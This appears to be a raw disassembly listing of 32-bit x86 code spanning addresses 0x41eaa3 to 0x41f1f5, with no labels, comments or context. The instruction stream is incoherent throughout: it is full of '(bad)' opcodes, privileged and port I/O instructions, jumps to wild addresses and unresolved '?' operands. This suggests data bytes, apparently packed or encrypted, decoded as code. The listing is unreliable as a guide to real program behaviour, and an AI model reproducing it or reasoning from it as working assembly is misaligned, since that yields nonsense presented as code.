  41eaa3:	mov    BYTE PTR [edx],bl
  41eaa5:	out    dx,eax
  41eaa6:	dec    esi
  41eaa7:	pusha  
  41eaa8:	daa    
  41eaa9:	stos   BYTE PTR es:[edi],al
  41eaaa:	fcmovne st,st(5)
  41eaac:	adc    DWORD PTR [edx],edx
  41eaae:	dec    ebx
  41eaaf:	adc    eax,0x4267d4f7
  41eab4:	xchg   ebp,eax
  41eab5:	cmp    DWORD PTR [esi],ebx
  41eab7:	loop   0x41eacd
  41eab9:	int3   
  41eaba:	xchg   bh,al
  41eabc:	jnp    0x41ea44
  41eabe:	xchg   edx,eax
  41eabf:	rcr    ah,cl
  41eac1:	test   al,0x3d
  41eac4:	loopne 0x41ea56
  41eac6:	ret    
  41eac7:	popf   
  41eac8:	pop    ss
  41eac9:	cmc    
  41eaca:	int    0x5a
  41eacc:	and    dl,BYTE PTR [ebx-0x75543b8f]
  41ead2:	sbb    DWORD PTR [eax],ebp
  41ead4:	xor    eax,0x3d074cce
  41ead9:	idiv   ah
  41eadb:	and    al,0xfd
  41eadd:	icebp  
  41eade:	jge    0x41eb05
  41eae0:	retf   
  41eae1:	jmp    0xd02a0f70
  41eae6:	cmp    ecx,esi
  41eae8:	popf   
  41eae9:	mov    al,ds:0xb0ebd888
  41eaee:	jmp    0x72ff53b2
  41eaf3:	push   esp
  41eaf4:	xchg   bl,ch
  41eaf6:	mov    ebp,0x7d98d0ec
  41eafb:	sub    DWORD PTR [ebx],edx
  41eafd:	ret    
  41eafe:	pop    ecx
  41eaff:	(bad)  
  41eb00:	mov    edx,0x71608ad0
  41eb05:	inc    edi
  41eb06:	icebp  
  41eb07:	xchg   esp,eax
  41eb08:	arpl   bx,cx
  41eb0a:	pop    eax
  41eb0b:	mov    bh,0x42
  41eb0d:	test   BYTE PTR [esi+0x482acb93],0xb7
  41eb14:	fsubr  QWORD PTR [ecx+0x3784990d]
  41eb1a:	in     eax,dx
  41eb1b:	jns    0x41eb3b
  41eb1d:	dec    esi
  41eb1e:	repz cmp BYTE PTR ds:0x8d05d1f8,cl
  41eb25:	pop    esp
  41eb26:	and    al,0x83
  41eb28:	inc    ecx
  41eb29:	fld    DWORD PTR [ebx-0x4a]
  41eb2c:	mov    DWORD PTR [ebx+0x1aa79761],ebx
  41eb32:	mov    ebp,0x2778fa0b
  41eb37:	leave  
  41eb38:	lea    eax,[edx]
  41eb3a:	mov    edi,0x31db9db8
  41eb3f:	loop   0x41eb1b
  41eb41:	mov    esp,0xae5a99ba
  41eb46:	sbb    bl,dl
  41eb48:	push   ecx
  41eb49:	(bad)  
  41eb4a:	int3   
  41eb4b:	sbb    al,BYTE PTR [esi+0x5f36c25d]
  41eb51:	xchg   esp,eax
  41eb52:	sbb    cl,0x8e
  41eb55:	push   ds
  41eb56:	sbb    eax,esp
  41eb58:	rol    BYTE PTR [edx],cl
  41eb5a:	or     eax,0xe5d632b4
  41eb5f:	jbe    0x41eb42
  41eb61:	int    0xdb
  41eb63:	jno    0x41eb61
  41eb65:	(bad)  
  41eb66:	stc    
  41eb67:	and    al,0xe9
  41eb69:	mov    cl,0x29
  41eb6b:	and    al,0x76
  41eb6d:	sbb    DWORD PTR ds:0x326d0152,0xffffffde
  41eb74:	sub    eax,0x2632cf61
  41eb79:	ins    DWORD PTR es:[edi],dx
  41eb7a:	into   
  41eb7b:	push   ds
  41eb7c:	jo     0x41eb6b
  41eb7e:	outs   dx,BYTE PTR ds:[esi]
  41eb7f:	add    bh,BYTE PTR [eax+0x6260951f]
  41eb85:	mov    cl,0xf1
  41eb87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb88:	scas   eax,DWORD PTR es:[edi]
  41eb89:	pop    es
  41eb8a:	jns    0x41eb2e
  41eb8c:	cmp    DWORD PTR [esi],esi
  41eb8e:	je     0x41eb7c
  41eb90:	jns    0x41eba0
  41eb92:	(bad)  
  41eb93:	into   
  41eb94:	sub    BYTE PTR ds:0x7b19bb74,bh
  41eb9a:	mov    al,ds:0xc26fee2d
  41eb9f:	pop    ds
  41eba0:	fcom   DWORD PTR [eax-0x306a01f6]
  41eba6:	pop    edx
  41eba7:	push   esi
  41eba8:	push   edi
  41eba9:	add    ecx,0x5
  41ebac:	call   0xd995:0x7acd9b47
  41ebb3:	loopne 0x41eb7c
  41ebb5:	sar    edi,1
  41ebb7:	enter  0xbdd3,0x7f
  41ebbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebbc:	pop    ds
  41ebbd:	push   edx
  41ebbe:	sti    
  41ebbf:	mov    edx,0x32583971
  41ebc4:	dec    ebp
  41ebc5:	sub    DWORD PTR [eax-0x6b07219b],esp
  41ebcb:	pushf  
  41ebcc:	fisttp WORD PTR [edi]
  41ebce:	cli    
  41ebcf:	adc    ch,bl
  41ebd1:	fnstsw WORD PTR [ebx]
  41ebd3:	test   al,0x83
  41ebd5:	das    
  41ebd6:	pop    ds
  41ebd7:	add    ah,BYTE PTR [ebx]
  41ebd9:	xchg   edi,eax
  41ebda:	cmp    eax,0xe76e3e10
  41ebdf:	xor    eax,DWORD PTR [ecx]
  41ebe1:	das    
  41ebe2:	cmp    eax,edi
  41ebe4:	ret    0xa957
  41ebe7:	inc    edx
  41ebe8:	cwde   
  41ebe9:	pop    eax
  41ebea:	std    
  41ebeb:	cmp    eax,0x410afea7
  41ebf0:	lea    edi,[ebp+ebp*8+0xefa4695]
  41ebf7:	test   DWORD PTR es:[ecx-0x249dce28],ecx
  41ebfe:	jne    0x41ebf0
  41ec00:	or     BYTE PTR [ebp-0x58f23916],ah
  41ec06:	xchg   esi,eax
  41ec07:	add    BYTE PTR [ebx-0x30],cl
  41ec0a:	sbb    al,0x1
  41ec0c:	loop   0x41ebf1
  41ec0e:	aaa    
  41ec0f:	add    al,0x18
  41ec11:	or     dl,dl
  41ec13:	inc    eax
  41ec14:	cmp    esi,DWORD PTR [esi+0x3b]
  41ec17:	shr    DWORD PTR [edi],cl
  41ec19:	and    ah,bh
  41ec1b:	mov    al,ds:0x3abd3406
  41ec20:	xchg   esi,eax
  41ec21:	adc    ebp,DWORD PTR [ebx-0x6e]
  41ec24:	mov    bl,0x9a
  41ec26:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41ec28:	cli    
  41ec29:	sub    eax,0xffdf24f1
  41ec2e:	out    0x7,eax
  41ec30:	mov    esp,0x94f05d3
  41ec35:	or     eax,0xfd208434
  41ec3a:	daa    
  41ec3b:	inc    esp
  41ec3c:	outs   dx,DWORD PTR ds:[esi]
  41ec3d:	adc    bl,BYTE PTR ds:0xc525a8a1
  41ec43:	xor    eax,esp
  41ec45:	cmp    BYTE PTR [ecx],bh
  41ec47:	mov    dh,al
  41ec49:	mov    ecx,0x6b6ad224
  41ec4e:	xor    esp,DWORD PTR [edi+0x44a61499]
  41ec54:	call   0xe01f08ca
  41ec59:	fisub  WORD PTR [eax]
  41ec5b:	jno    0x41ecbe
  41ec5d:	mov    ecx,0x206c7e64
  41ec62:	sub    eax,DWORD PTR ds:[ecx]
  41ec65:	fdivrp st(4),st
  41ec67:	ss pop esp
  41ec69:	out    dx,al
  41ec6a:	xchg   ch,ah
  41ec6c:	dec    esi
  41ec6d:	(bad)  
  41ec6e:	and    BYTE PTR [ebx+ecx*4-0x5edeaad],bl
  41ec75:	xor    edi,DWORD PTR [eax+0x33]
  41ec78:	popf   
  41ec79:	les    edx,FWORD PTR fs:[edx+0xe956732]
  41ec80:	sbb    esi,ecx
  41ec82:	lock push edi
  41ec84:	ror    BYTE PTR [esi-0x2],cl
  41ec87:	pop    edi
  41ec88:	pop    edi
  41ec89:	sbb    al,0x86
  41ec8b:	imul   eax,edx,0x21
  41ec8e:	xchg   DWORD PTR ds:0x2b99e787,esp
  41ec94:	fs aas 
  41ec96:	and    BYTE PTR [edx+0x46],ah
  41ec99:	pop    edi
  41ec9a:	sbb    BYTE PTR [edx],al
  41ec9c:	xor    eax,0xa26e7c2a
  41eca1:	outs   dx,BYTE PTR ds:[esi]
  41eca2:	pop    ebx
  41eca3:	cdq    
  41eca4:	neg    BYTE PTR [edi]
  41eca6:	aam    0xa1
  41eca8:	fcom   DWORD PTR [edi]
  41ecaa:	mov    WORD PTR [ebp+eax*8-0x39],cs
  41ecae:	jge    0x41ec5b
  41ecb0:	mov    eax,ds:0x9d743c2a
  41ecb5:	and    al,BYTE PTR [eax]
  41ecb7:	sbb    cl,BYTE PTR [esi-0x6f]
  41ecba:	mov    ebp,0x86dcb134
  41ecbf:	push   ecx
  41ecc0:	pusha  
  41ecc1:	push   edx
  41ecc2:	(bad)  [edx+eax*4-0x7cacbf9b]
  41ecc9:	repnz cs addr16 push ecx
  41eccd:	outs   dx,DWORD PTR ds:[esi]
  41ecce:	js     0x41ed2d
  41ecd0:	ret    0x9bf1
  41ecd3:	adc    BYTE PTR ds:0x1f86d3e5,ch
  41ecd9:	mov    ebx,DWORD PTR [edx+0x7f]
  41ecdc:	or     dh,BYTE PTR [eax]
  41ecde:	xchg   bh,bh
  41ece0:	es retf 
  41ece2:	jbe    0x41ec69
  41ece4:	push   cs
  41ece5:	cs push ebp
  41ece7:	cmp    edx,DWORD PTR [eax+edx*2+0xa]
  41eceb:	imul   edi,ebx,0x3c
  41ecee:	inc    esp
  41ecef:	dec    edi
  41ecf0:	fsub   DWORD PTR ds:0x2cf5bd15
  41ecf6:	pop    ss
  41ecf7:	loope  0x41ec8b
  41ecf9:	jmp    0x41ed60
  41ecfb:	adc    bh,BYTE PTR [ecx-0x2ce6794b]
  41ed01:	scas   al,BYTE PTR es:[edi]
  41ed02:	into   
  41ed03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed04:	sub    ecx,edx
  41ed06:	add    esi,ecx
  41ed08:	adc    eax,0xdb34b39a
  41ed0d:	fisubr WORD PTR [eax+0xfaa996a]
  41ed13:	xchg   DWORD PTR [ebx],ecx
  41ed15:	in     eax,0xd8
  41ed17:	mov    WORD PTR [ebx+0x6e],?
  41ed1a:	cdq    
  41ed1b:	shl    bl,1
  41ed1d:	xor    esi,edi
  41ed1f:	adc    al,0x6b
  41ed21:	push   esp
  41ed22:	sbb    BYTE PTR [edx],bh
  41ed24:	mov    cl,0x2f
  41ed26:	and    esi,DWORD PTR [ecx-0x5]
  41ed29:	cwde   
  41ed2a:	xchg   edx,eax
  41ed2b:	mov    al,0x8a
  41ed2d:	stc    
  41ed2e:	push   sp
  41ed30:	mov    bl,0x42
  41ed32:	aaa    
  41ed33:	pop    edx
  41ed34:	cmp    ch,ah
  41ed36:	sbb    cl,BYTE PTR [ebx+0x6b31288e]
  41ed3c:	pop    edx
  41ed3d:	fld    TBYTE PTR [edi]
  41ed3f:	sub    ebp,edi
  41ed41:	add    dl,bl
  41ed43:	xchg   edx,eax
  41ed44:	mov    cl,dh
  41ed46:	imul   esp,DWORD PTR [ebx],0x7e80a5a1
  41ed4c:	mov    dl,0x76
  41ed4e:	inc    esp
  41ed4f:	cmp    al,0x90
  41ed51:	fldcw  WORD PTR [edi]
  41ed53:	stos   BYTE PTR es:[edi],al
  41ed54:	sahf   
  41ed55:	fmul   QWORD PTR [esi+0x1b]
  41ed58:	loope  0x41ed1d
  41ed5a:	inc    esi
  41ed5b:	fdiv   QWORD PTR [ecx-0x13]
  41ed5e:	inc    esp
  41ed5f:	jle    0x41ed8e
  41ed61:	fadd   DWORD PTR [edx-0x72]
  41ed64:	pop    eax
  41ed65:	sbb    eax,0x9cd074e1
  41ed6a:	adc    eax,0xdc52c9b9
  41ed6f:	imul   ecx,DWORD PTR [edi-0x4279d1d8],0x6c583c8
  41ed79:	fldcw  WORD PTR [ebp+edi*4-0x4a]
  41ed7d:	icebp  
  41ed7e:	je     0x41ed57
  41ed80:	and    al,0xa9
  41ed82:	out    dx,eax
  41ed83:	pop    ds
  41ed84:	xor    al,bl
  41ed86:	xchg   bh,bl
  41ed88:	cmp    ebp,DWORD PTR [eax+0x3a]
  41ed8b:	mov    BYTE PTR ds:0xd6edc1e4,bh
  41ed91:	std    
  41ed92:	jecxz  0x41ed70
  41ed94:	push   cs
  41ed95:	dec    ecx
  41ed96:	repnz push es
  41ed98:	sbb    DWORD PTR [ebp-0x7f2c5fe1],esi
  41ed9e:	in     al,dx
  41ed9f:	cmp    edx,DWORD PTR [esp+esi*2]
  41eda2:	aam    0x55
  41eda4:	jnp    0x41edd7
  41eda6:	sbb    DWORD PTR [ebp+0x6a],eax
  41eda9:	pop    ss
  41edaa:	(bad)  
  41edab:	fstp   TBYTE PTR [ebp-0x23]
  41edae:	pop    es
  41edaf:	mul    DWORD PTR [edx-0x46]
  41edb2:	retf   0xfa07
  41edb5:	inc    esp
  41edb6:	dec    edx
  41edb7:	shl    ebx,1
  41edb9:	add    ebp,esp
  41edbb:	inc    eax
  41edbc:	xchg   ebx,eax
  41edbd:	nop
  41edbe:	sbb    dh,ah
  41edc0:	stc    
  41edc1:	cmp    BYTE PTR [eax-0x7a],ah
  41edc4:	mov    ah,0xe
  41edc6:	arpl   WORD PTR [edi-0x4fae71b2],si
  41edcc:	pusha  
  41edcd:	cmp    DWORD PTR [edx+edi*1-0x2f],ebx
  41edd1:	ins    BYTE PTR es:[edi],dx
  41edd2:	or     al,0x67
  41edd4:	shl    DWORD PTR [ebp+0x1e],1
  41edd7:	jmp    0x49de1eae
  41eddc:	int    0x4b
  41edde:	xor    DWORD PTR [esp+edi*4-0x23],esp
  41ede2:	mov    ds:0xf09621c0,al
  41ede7:	push   ebx
  41ede8:	loopne 0x41ee0a
  41edea:	jae    0x41ee29
  41edec:	or     eax,0xc38d3c53
  41edf1:	mov    ecx,0xc4cd13cb
  41edf6:	sub    ah,BYTE PTR [edi+0x40d2d04a]
  41edfc:	data16 sbb BYTE PTR [ecx-0x77],cl
  41ee00:	adc    esp,DWORD PTR [edx-0x7513eaef]
  41ee06:	xchg   DWORD PTR [edi],esp
  41ee08:	mov    ds:0x7f1fe6,al
  41ee0d:	mov    edi,0xaa224237
  41ee12:	sub    eax,0xc8ca1588
  41ee17:	xlat   BYTE PTR ds:[ebx]
  41ee18:	pop    ss
  41ee19:	popa   
  41ee1a:	fs rcr ebx,cl
  41ee1d:	into   
  41ee1e:	sar    DWORD PTR [ecx+eiz*2-0x76c179f5],0x84
  41ee26:	sub    eax,0x26608627
  41ee2b:	sbb    eax,0x25e9f401
  41ee30:	ret    0x180f
  41ee33:	rcl    cl,1
  41ee35:	rcr    edx,cl
  41ee37:	(bad)  
  41ee39:	repz rcl edx,0xe9
  41ee3d:	push   edi
  41ee3e:	arpl   WORD PTR [edx+0x6369711a],di
  41ee44:	enter  0x98c,0xab
  41ee48:	jle    0x41edd4
  41ee4a:	lods   eax,DWORD PTR ds:[esi]
  41ee4b:	sbb    dh,BYTE PTR [ebp+0x41]
  41ee4e:	repnz or al,bl
  41ee51:	jno    0x41eece
  41ee53:	xor    al,BYTE PTR ds:0x425dadbe
  41ee59:	jb     0x41ee9c
  41ee5b:	(bad)  
  41ee5c:	mov    bl,0x29
  41ee5e:	dec    esi
  41ee5f:	adc    ch,cl
  41ee61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee62:	xor    al,0xcd
  41ee64:	cmc    
  41ee65:	call   0xb9a9bcf3
  41ee6a:	pop    ebp
  41ee6b:	test   BYTE PTR [eax-0x125f1d9c],bl
  41ee71:	fidiv  DWORD PTR [edx+0x30]
  41ee74:	ret    0x8d6
  41ee77:	dec    eax
  41ee78:	arpl   WORD PTR [eax-0x64],sp
  41ee7b:	cmp    eax,0xe5a76ace
  41ee80:	add    al,0xfc
  41ee82:	pop    ebx
  41ee83:	fsubr  st,st(3)
  41ee85:	in     al,dx
  41ee86:	xor    eax,DWORD PTR [edi]
  41ee88:	mov    bh,0x4e
  41ee8a:	or     edx,DWORD PTR [eax+0xe]
  41ee8d:	and    esp,edx
  41ee8f:	dec    esp
  41ee90:	js     0x41ef09
  41ee92:	sub    eax,edx
  41ee94:	inc    ebx
  41ee95:	adc    eax,0xb63f846b
  41ee9a:	mov    eax,ds:0x538bdd90
  41ee9f:	jle    0x41eef3
  41eea1:	push   ss
  41eea2:	shr    dh,0x39
  41eea5:	jl     0x41eee6
  41eea7:	sub    BYTE PTR [esi-0x49],ah
  41eeaa:	push   ebx
  41eeab:	mov    eax,0xe044d146
  41eeb0:	xor    ch,BYTE PTR [esi]
  41eeb2:	mov    BYTE PTR [ebp+0x7b],al
  41eeb5:	adc    al,0x7
  41eeb7:	icebp  
  41eeb8:	stc    
  41eeb9:	(bad)  
  41eeba:	cmp    BYTE PTR es:[edx-0x2f29c7d6],cl
  41eec1:	fadd   DWORD PTR [esi]
  41eec3:	popf   
  41eec4:	mov    ebx,DWORD PTR [esp+eax*2+0x11]
  41eec8:	int3   
  41eec9:	fistp  QWORD PTR [edx+0x2bb53e8f]
  41eecf:	je     0x41ee98
  41eed1:	int    0x36
  41eed3:	ficomp WORD PTR [eax+ecx*8-0x27c92ea9]
  41eeda:	ins    DWORD PTR es:[edi],dx
  41eedb:	in     eax,dx
  41eedc:	sub    al,0xd7
  41eede:	int3   
  41eedf:	inc    esp
  41eee0:	jnp    0x41eedc
  41eee2:	into   
  41eee3:	cmp    eax,DWORD PTR [ebx-0x6fdaa96c]
  41eee9:	pop    es
  41eeea:	mov    ds,WORD PTR [esi+0x79]
  41eeed:	(bad)  
  41eeee:	pop    edx
  41eeef:	sti    
  41eef0:	popf   
  41eef1:	lahf   
  41eef2:	dec    ebx
  41eef3:	call   0x8c9031f7
  41eef8:	jge    0x41ee85
  41eefa:	retf   
  41eefb:	lods   eax,DWORD PTR ds:[esi]
  41eefc:	cmp    edx,DWORD PTR [esi+0x1b]
  41eeff:	cmovo  ebp,DWORD PTR [esi+0x611880d8]
  41ef06:	add    al,0xaa
  41ef08:	jmp    ebx
  41ef0a:	add    DWORD PTR [ecx+0x26],esp
  41ef0d:	in     eax,0xdb
  41ef0f:	ror    BYTE PTR [esi+0x3574a8e8],0xc6
  41ef16:	ins    DWORD PTR es:[edi],dx
  41ef17:	lock adc ch,bh
  41ef1a:	xor    BYTE PTR [eax-0x53dd6860],0x86
  41ef21:	xor    ax,0x492c
  41ef25:	ficom  DWORD PTR [ebx*1+0x6aa65138]
  41ef2c:	add    BYTE PTR [ecx],bl
  41ef2e:	aaa    
  41ef2f:	dec    edi
  41ef30:	ins    DWORD PTR es:[edi],dx
  41ef31:	add    bl,BYTE PTR [edi+eiz*1]
  41ef34:	sti    
  41ef35:	loop   0x41ef76
  41ef37:	add    dl,BYTE PTR [eax+0x19]
  41ef3a:	mov    edi,0xa56f9627
  41ef3f:	dec    edi
  41ef40:	sub    ah,BYTE PTR fs:[eax]
  41ef43:	ins    BYTE PTR es:[edi],dx
  41ef44:	imul   BYTE PTR [eax-0x7f]
  41ef47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef48:	mov    ch,BYTE PTR [edx+0x4a]
  41ef4b:	sbb    al,0xe8
  41ef4d:	xchg   BYTE PTR [edx-0x64],dl
  41ef50:	sbb    ecx,DWORD PTR [esi+eax*8]
  41ef53:	pop    ss
  41ef54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef55:	xor    al,0x2c
  41ef57:	loopne 0x41ef7a
  41ef59:	ret    0x1e4a
  41ef5c:	je     0x41efaf
  41ef5e:	adc    cl,BYTE PTR [esi]
  41ef60:	sbb    cl,BYTE PTR [ecx-0x2ebb470f]
  41ef66:	test   DWORD PTR [esi+0x7f24aeff],esp
  41ef6c:	push   es
  41ef6d:	mov    cl,0xfe
  41ef6f:	xchg   DWORD PTR [eax+0x72],eax
  41ef72:	inc    ebx
  41ef73:	test   DWORD PTR [esi+0x13431a5e],esp
  41ef79:	retf   0xeccd
  41ef7c:	fst    st(3)
  41ef7e:	fs sbb edi,esp
  41ef81:	xchg   edx,eax
  41ef82:	int    0xdc
  41ef84:	mov    edx,0x5855e39f
  41ef89:	push   0xffffff89
  41ef8b:	pop    ebp
  41ef8c:	adc    BYTE PTR [eax-0x29e3d37d],bh
  41ef92:	iret   
  41ef93:	xchg   esi,eax
  41ef95:	mov    WORD PTR [ecx-0x1abdb966],fs
  41ef9b:	and    ecx,DWORD PTR [ebx-0x4a]
  41ef9e:	(bad)  
  41efa0:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efa2:	rol    al,1
  41efa4:	add    BYTE PTR [esi],dl
  41efa6:	xchg   edx,ecx
  41efa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efa9:	hlt    
  41efaa:	cmc    
  41efab:	lock call 0x55c65dae
  41efb1:	sbb    esp,DWORD PTR [edx]
  41efb3:	and    BYTE PTR [eax+0x1a],0x62
  41efb7:	(bad)
  41efbb:	repz mov bl,BYTE PTR [edi-0x5f3d41ef]
  41efc2:	into   
  41efc3:	xchg   edx,eax
  41efc4:	in     al,dx
  41efc5:	add    ch,BYTE PTR [esi+0x1305ed0c]
  41efcb:	(bad)  
  41efcc:	imul   edx,DWORD PTR [esi],0xffffffe6
  41efcf:	jmp    0x41ef78
  41efd1:	aad    0x6f
  41efd3:	xchg   edi,eax
  41efd4:	pop    ss
  41efd5:	repz clc 
  41efd7:	mov    WORD PTR [eax+0x3d],?
  41efda:	mov    cl,0x8f
  41efdc:	(bad)  
  41efdd:	and    al,0xb6
  41efdf:	pop    edi
  41efe0:	push   esp
  41efe1:	fstp   TBYTE PTR ds:0xc038693e
  41efe7:	add    BYTE PTR [esi],0x2a
  41efea:	cmp    DWORD PTR [ecx],ecx
  41efec:	pusha  
  41efed:	loopne 0x41f00d
  41efef:	test   eax,0x4543f0cc
  41eff4:	push   esp
  41eff5:	cmp    edx,DWORD PTR [edi+0x77]
  41eff8:	push   0x51
  41effa:	jbe    0x41eff9
  41effc:	out    dx,eax
  41effd:	push   eax
  41effe:	push   ebp
  41efff:	mov    WORD PTR [edx-0x57],?
  41f002:	xor    ebx,ebx
  41f004:	dec    ebx
  41f005:	data16 and al,0xf1
  41f008:	mov    dl,bh
  41f00a:	pusha  
  41f00b:	jb     0x41efbe
  41f00d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f00e:	cs and eax,0x1e3cb5cd
  41f014:	mov    DWORD PTR [eax+edi*8+0x6970e8f4],esi
  41f01b:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f01d:	(bad)
  41f020:	cmp    DWORD PTR [ebp+0x65a6773c],edx
  41f026:	lock push ss
  41f028:	jo     0x41f020
  41f02a:	jne    0x41f057
  41f02c:	pop    ds
  41f02d:	mov    eax,0x95c06ef
  41f032:	repz push ds
  41f034:	out    dx,eax
  41f035:	rol    edx,cl
  41f037:	stos   BYTE PTR es:[edi],al
  41f038:	push   edi
  41f039:	leave  
  41f03a:	call   0x73167a45
  41f03f:	cmp    eax,0x42bbf192
  41f044:	inc    dl
  41f046:	fwait
  41f047:	xor    BYTE PTR [ebx+0x39f2aa68],0x44
  41f04e:	daa    
  41f04f:	lods   al,BYTE PTR ds:[esi]
  41f050:	aaa    
  41f051:	pop    ecx
  41f052:	test   BYTE PTR [edx+0x67],dl
  41f055:	add    edx,esi
  41f057:	fsubr  QWORD PTR ds:0x5b7e6dfe
  41f05d:	stos   BYTE PTR es:[edi],al
  41f05e:	in     al,dx
  41f05f:	jecxz  0x41f05a
  41f061:	les    esi,FWORD PTR cs:[esi]
  41f064:	pop    ecx
  41f065:	push   edi
  41f066:	mov    bl,bl
  41f068:	pop    edi
  41f069:	mov    esi,0xa041cfa2
  41f06e:	aam    0xb7
  41f070:	int    0x0
  41f072:	addr16 mov al,ds:0x3c56
  41f076:	scas   al,BYTE PTR es:[edi]
  41f077:	ror    BYTE PTR [esp+eax*8],cl
  41f07a:	dec    esp
  41f07b:	dec    edi
  41f07c:	dec    ebx
  41f07d:	pushf  
  41f07e:	rcr    BYTE PTR [ecx-0x69274dc],cl
  41f084:	push   cs
  41f085:	pop    ss
  41f086:	dec    ebp
  41f087:	adc    DWORD PTR [ebx-0x7414f01c],0x43da6836
  41f091:	rcl    BYTE PTR es:[edx+0x54],1
  41f095:	(bad)  
  41f096:	jecxz  0x41f079
  41f098:	les    ebx,FWORD PTR [edi]
  41f09a:	or     BYTE PTR [ebx+0x1e],ah
  41f09d:	push   0xe6e6cda6
  41f0a2:	push   edx
  41f0a3:	dec    eax
  41f0a4:	lahf   
  41f0a5:	loop   0x41f02b
  41f0a7:	pop    esp
  41f0a8:	mov    esi,0x37898914
  41f0ad:	jne    0x41f056
  41f0af:	je     0x41f03b
  41f0b1:	jg     0x41f086
  41f0b3:	mov    esp,?
  41f0b5:	and    al,0xd1
  41f0b7:	sub    al,0x48
  41f0b9:	lods   eax,DWORD PTR ds:[esi]
  41f0ba:	mov    dh,0x3b
  41f0bc:	fs sbb eax,0x68d2ffe5
  41f0c2:	mov    ds:0x845c4b69,al
  41f0c7:	outs   dx,BYTE PTR ds:[esi]
  41f0c8:	inc    edi
  41f0c9:	lods   eax,DWORD PTR ds:[esi]
  41f0ca:	ss push ecx
  41f0cc:	daa    
  41f0cd:	adc    al,0xa7
  41f0cf:	sbb    BYTE PTR [edi-0x46],ch
  41f0d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0d3:	jb     0x41f0ec
  41f0d5:	mov    ds:0xb2aae457,eax
  41f0da:	push   eax
  41f0db:	in     al,dx
  41f0dc:	xchg   ebp,eax
  41f0dd:	xchg   ebx,eax
  41f0de:	push   ds
  41f0df:	and    DWORD PTR [esi+eiz*4],0x7611efd8
  41f0e6:	pushf  
  41f0e7:	add    ebp,DWORD PTR ds:0x5fc47693
  41f0ed:	xor    DWORD PTR [edx-0x61],eax
  41f0f0:	cvtpi2ps xmm6,QWORD PTR [esi+eax*8+0x1fb6f40f]
  41f0f8:	mov    eax,ds:0x8a8b14fb
  41f0fd:	cs leave 
  41f0ff:	pop    ds
  41f100:	xor    BYTE PTR [edx-0x178a9912],ch
  41f106:	sbb    al,0x10
  41f108:	sub    edi,DWORD PTR [ebx]
  41f10a:	ins    DWORD PTR es:[edi],dx
  41f10b:	inc    ebp
  41f10c:	test   DWORD PTR [ebx+ebp*2+0x2e8cf895],esi
  41f113:	add    esi,ebp
  41f115:	xlat   BYTE PTR ds:[ebx]
  41f116:	pop    es
  41f117:	inc    edx
  41f118:	or     ebx,DWORD PTR [esi+0x7a1645b8]
  41f11e:	dec    eax
  41f11f:	nop
  41f120:	jo     0x41f144
  41f122:	enter  0x1704,0x6
  41f126:	into   
  41f127:	mov    ecx,0xa61ddbd7
  41f12c:	mov    eax,0x52777938
  41f131:	es cli 
  41f133:	pop    esi
  41f134:	fidiv  WORD PTR [esi+ecx*1+0x1d]
  41f138:	ja     0x41f148
  41f13a:	mov    edx,0xf9387a2f
  41f13f:	rcl    DWORD PTR [esi+ebx*8+0x35],1
  41f143:	(bad)  [edi+0x1af61f5e]
  41f149:	pushf  
  41f14a:	mov    ds:0x47f17378,eax
  41f14f:	sbb    al,BYTE PTR ds:0x1c4e36f8
  41f155:	add    BYTE PTR [ebx+0x77],cl
  41f158:	or     eax,0xf2ccb19e
  41f15d:	mov    ecx,0xeaeb3cd3
  41f162:	adc    edi,DWORD PTR [ebx+0x7a51d30f]
  41f168:	inc    DWORD PTR [ebx+0x28]
  41f16b:	repz xchg esi,eax
  41f16d:	daa    
  41f16e:	inc    ebx
  41f16f:	push   cs
  41f170:	jnp    0x41f141
  41f172:	pop    ss
  41f173:	fistp  DWORD PTR [edx-0x20bff848]
  41f179:	or     al,0x9b
  41f17b:	scas   al,BYTE PTR es:[edi]
  41f17c:	xchg   ebx,eax
  41f17d:	dec    edx
  41f17e:	jle    0x41f14a
  41f180:	pop    es
  41f181:	mov    ds:0x333450e4,eax
  41f186:	fldenv [ebx+0x5e265bff]
  41f18c:	jnp    0x41f1d6
  41f18e:	loope  0x41f1ff
  41f190:	or     BYTE PTR [eax-0x27],0xd5
  41f194:	inc    eax
  41f195:	stos   BYTE PTR es:[edi],al
  41f196:	push   esp
  41f197:	xchg   esi,eax
  41f198:	stos   DWORD PTR es:[edi],eax
  41f199:	(bad)  
  41f19a:	xor    DWORD PTR [edx+0x1d2fd133],esi
  41f1a0:	aas    
  41f1a1:	cli    
  41f1a2:	loopne 0x41f1f3
  41f1a4:	xchg   DWORD PTR [edi],edx
  41f1a6:	sbb    eax,0xd8500fe2
  41f1ab:	sar    BYTE PTR [edi+eiz*2-0x47e55c04],1
  41f1b2:	sbb    ch,BYTE PTR [ecx]
  41f1b4:	repz inc ebx
  41f1b6:	pushf  
  41f1b7:	push   0x20e56ba6
  41f1bc:	clc    
  41f1bd:	cmp    ch,BYTE PTR [ebp+0x14]
  41f1c0:	popa   
  41f1c1:	loopne 0x41f1f4
  41f1c3:	std    
  41f1c4:	sbb    al,BYTE PTR [ecx]
  41f1c6:	js     0x41f197
  41f1c8:	addr16 dec esp
  41f1ca:	fisttp DWORD PTR [ecx+edx*2]
  41f1cd:	mov    eax,0xcfd310af
  41f1d2:	loope  0x41f252
  41f1d4:	jne    0x41f15d
  41f1d6:	jecxz  0x41f15a
  41f1d8:	sbb    al,0x30
  41f1da:	(bad)  [esi-0x5b]
  41f1dd:	fisttp QWORD PTR [edx]
  41f1df:	scas   eax,DWORD PTR es:[edi]
  41f1e0:	clc    
  41f1e1:	xor    al,0x4a
  41f1e3:	inc    esi
  41f1e4:	add    DWORD PTR [esi-0x73],0x70
  41f1e8:	lods   al,BYTE PTR ds:[esi]
  41f1e9:	mov    eax,0x22893a80
  41f1ee:	shl    DWORD PTR [ebp-0x5ed0240],0x50
  41f1f5:	sbb    eax,0xec836d2c
